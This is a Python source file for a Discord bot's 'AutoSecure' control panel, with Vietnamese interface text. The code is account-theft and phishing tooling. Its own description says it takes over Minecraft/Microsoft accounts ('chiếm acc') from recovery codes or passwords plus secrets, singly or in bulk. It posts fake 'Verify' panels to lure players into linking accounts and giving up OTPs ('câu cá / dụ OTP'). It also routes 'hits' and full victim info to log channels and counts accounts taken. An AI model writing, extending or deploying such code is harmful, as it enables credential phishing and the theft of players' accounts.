import discord
from discord.ext import commands
import asyncio
from datetime import datetime

from config import get_config, get_bot_config, save_config
from ui.buttons.link_account import LinkAccountView
from database.database import DBConnection
from ui.modals.recovery_code import recoveryCodeModal
from ui.modals.recovery_secret import recoveryAuthModal
from ui.modals.recovery_code_bulk import BulkRecoveryCodeModal
from ui.modals.recovery_secret_bulk import BulkAuthRecoveryModal

def _build_panel_embed(bot: commands.Bot) -> discord.Embed:
    cfg = get_config()
    dcfg = cfg.get("discord", {})
    logs_ch = dcfg.get("logs_channel") or "Chưa cài đặt"
    hits_ch = dcfg.get("accounts_channel") or "Chưa cài đặt"
    
    acc_count = 0
    try:
        with DBConnection() as db:
            rows = db.get_all_secured_accounts()
            acc_count = len(rows) if rows else 0
    except Exception:
        pass

    embed = discord.Embed(
        title="AutoSecure - Control Panel",
        description=(
            "**Bảng Điều Khiển Nhanh Dành Cho Quản Trị Viên**\n\n"
            "**Phân biệt tính năng:**\n"
            "• **Hàng 1 (Secu 1 Acc)**: Dành cho Admin tự nhập mã khôi phục hoặc Pass + Secret để chiếm acc ngay.\n"
            "• **Hàng 2 (Secu Hàng Loạt)**: Dán danh sách nhiều tài khoản cùng lúc để xử lý song song.\n"
            "• **Gửi Khung Verify**: Gửi khung xác thực vào kênh cho người chơi bấm liên kết (câu cá / dụ OTP).\n"
            "• **Bảng Features**: Gửi bảng tính năng giới thiệu uy tín aut0 Features.\n"
            "• : Đặt kênh nhận ảnh Hit (#hit) và kênh nhận Full Info (#log)."
        ),
        color=0x2ECC71,
        timestamp=datetime.utcnow()
    )
    embed.add_field(
        name="Kênh #HIT (Chỉ Ảnh Flex)",
        value=f"<#{hits_ch}>" if str(hits_ch).isdigit() else f"`{hits_ch}`",
        inline=True
    )
    embed.add_field(
        name="Kênh #LOG (Full Info Admin)",
        value=f"<#{logs_ch}>" if str(logs_ch).isdigit() else f"`{logs_ch}`",
        inline=True
    )
    embed.add_field(
        name="Đã Secure Thành Công",
        value=f"**{acc_count}** accounts",
        inline=True
    )
    embed.set_footer(text="Bấm các nút bên dưới để thực hiện thao tác nhanh")
    return embed

class ControlPanelView(discord.ui.View):
    def __init__(self, bot: commands.Bot):
        super().__init__(timeout=None)
        self.bot = bot

    def _is_admin(self, user_id: int) -> bool:
        return user_id in self.bot.admins or len(self.bot.admins) == 0 or 0 in self.bot.admins

    # ---------------- Hàng 1: Secu 1 Acc (Admin) ----------------
    @discord.ui.button(
        label="Secu: Recovery Code",
        style=discord.ButtonStyle.primary,
        custom_id="panel:secu_rcode",
        row=0
    )
    async def secu_rcode_btn(self, button: discord.ui.Button, interaction: discord.Interaction):
        if not self._is_admin(interaction.user.id):
            await interaction.response.send_message("Ban khong co quyen quan tri!", ephemeral=True)
            return
        await interaction.response.send_modal(recoveryCodeModal())

    @discord.ui.button(
        label="Secu: Pass + Secret",
        style=discord.ButtonStyle.primary,
        custom_id="panel:secu_secret",
        row=0
    )
    async def secu_secret_btn(self, button: discord.ui.Button, interaction: discord.Interaction):
        if not self._is_admin(interaction.user.id):
            await interaction.response.send_message("Ban khong co quyen quan tri!", ephemeral=True)
            return
        await interaction.response.send_modal(recoveryAuthModal())

    # ---------------- Hàng 2: Secu Hàng Loạt (Bulk) ----------------
    @discord.ui.button(
        label="Bulk: Recovery Code",
        style=discord.ButtonStyle.secondary,
        custom_id="panel:bulk_rcode",
        row=1
    )
    async def bulk_rcode_btn(self, button: discord.ui.Button, interaction: discord.Interaction):
        if not self._is_admin(interaction.user.id):
            await interaction.response.send_message("Ban khong co quyen quan tri!", ephemeral=True)
            return
        await interaction.response.send_modal(BulkRecoveryCodeModal())

    @discord.ui.button(
        label="Bulk: Pass + Secret",
        style=discord.ButtonStyle.secondary,
        custom_id="panel:bulk_secret",
        row=1
    )
    async def bulk_secret_btn(self, button: discord.ui.Button, interaction: discord.Interaction):
        if not self._is_admin(interaction.user.id):
            await interaction.response.send_message("Ban khong co quyen quan tri!", ephemeral=True)
            return
        await interaction.response.send_modal(BulkAuthRecoveryModal())

    # ---------------- Hàng 3: Tiện ích & Cài Đặt Kênh ----------------
    @discord.ui.button(
        label="Gửi Khung Verify",
        style=discord.ButtonStyle.success,
        custom_id="panel:send_verify",
        row=2
    )
    async def send_verify_btn(self, button: discord.ui.Button, interaction: discord.Interaction):
        if not self._is_admin(interaction.user.id):
            await interaction.response.send_message("Ban khong co quyen quan tri!", ephemeral=True)
            return

        bdata = get_bot_config()
        vdata = bdata.get("embeds", {}).get("verification", {}).get("default", {})
        
        vembed = discord.Embed(
            title=vdata.get("title", "Xác thực tài khoản"),
            description=vdata.get("description", "Nhấn nút bên dưới để liên kết tài khoản Minecraft của bạn."),
            color=vdata.get("color", 0x3498DB)
        )
        if vdata.get("thumbnail"):
            vembed.set_thumbnail(url=vdata["thumbnail"])
        footer = vdata.get("footer") or {}
        if footer.get("text"):
            vembed.set_footer(text=footer["text"], icon_url=footer.get("icon_url") or None)
        for field in vdata.get("fields") or []:
            vembed.add_field(
                name=field.get("name") or "\u200b",
                value=field.get("value") or "\u200b",
                inline=bool(field.get("inline")),
            )

        await interaction.channel.send(embed=vembed, view=LinkAccountView())
        await interaction.response.send_message("Da gui bang Verify vao kenh nay thanh cong!", ephemeral=True)

    @discord.ui.button(
        label="Bảng Features",
        style=discord.ButtonStyle.success,
        custom_id="panel:send_features",
        row=2
    )
    async def send_features_btn(self, button: discord.ui.Button, interaction: discord.Interaction):
        if not self._is_admin(interaction.user.id):
            await interaction.response.send_message("Ban khong co quyen quan tri!", ephemeral=True)
            return
        from cogs.send_embed import build_features_embed
        fembed = build_features_embed()
        await interaction.channel.send(embed=fembed)
        await interaction.response.send_message("Da gui bang aut0 Features vao kenh nay thanh cong!", ephemeral=True)

    @discord.ui.button(
        label="Đặt Kênh #HIT",
        style=discord.ButtonStyle.secondary,
        custom_id="panel:set_hit",
        row=2
    )
    async def set_hit_btn(self, button: discord.ui.Button, interaction: discord.Interaction):
        if not self._is_admin(interaction.user.id):
            await interaction.response.send_message("Ban khong co quyen quan tri!", ephemeral=True)
            return

        cfg = get_config()
        cfg.setdefault("discord", {})["accounts_channel"] = str(interaction.channel_id)
        save_config(cfg)
        await interaction.response.send_message(
            f"Dat kenh <#{interaction.channel_id}> lam **Kênh Nhận Hit (#hit)** thanh cong!",
            ephemeral=True
        )

    @discord.ui.button(
        label="Đặt Kênh #LOG",
        style=discord.ButtonStyle.secondary,
        custom_id="panel:set_log",
        row=2
    )
    async def set_log_btn(self, button: discord.ui.Button, interaction: discord.Interaction):
        if not self._is_admin(interaction.user.id):
            await interaction.response.send_message("Ban khong co quyen quan tri!", ephemeral=True)
            return

        cfg = get_config()
        cfg.setdefault("discord", {})["logs_channel"] = str(interaction.channel_id)
        cfg.setdefault("discord", {})["censored_logs_channel"] = str(interaction.channel_id)
        save_config(cfg)
        await interaction.response.send_message(
            f"Dat kench <#{interaction.channel_id}> lam **Kênh Nhận Log (#log)** thanh cong!",
            ephemeral=True
        )

    @discord.ui.button(
        label="Làm Mới Bảng",
        style=discord.ButtonStyle.secondary,
        custom_id="panel:refresh",
        row=2
    )
    async def refresh_btn(self, button: discord.ui.Button, interaction: discord.Interaction):
        embed = _build_panel_embed(self.bot)
        await interaction.response.edit_message(embed=embed, view=self)

class ControlPanelCog(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @discord.slash_command(
        name="menu",
        description="Mở bảng điều khiển Menu phím bấm (Control Panel)"
    )
    async def menu_command(self, ctx: discord.ApplicationContext):
        if ctx.author.id not in self.bot.admins and len(self.bot.admins) > 0 and 0 not in self.bot.admins:
            await ctx.respond("Ban khong co quyen truy cap bang dieu khien!", ephemeral=True)
            return

        embed = _build_panel_embed(self.bot)
        view = ControlPanelView(self.bot)
        await ctx.respond(embed=embed, view=view)

    @discord.slash_command(
        name="panel",
        description="Mở bảng điều khiển Menu phím bấm (Control Panel)"
    )
    async def panel_command(self, ctx: discord.ApplicationContext):
        await self.menu_command(ctx)

def setup(bot: commands.Bot) -> None:
    bot.add_cog(ControlPanelCog(bot))
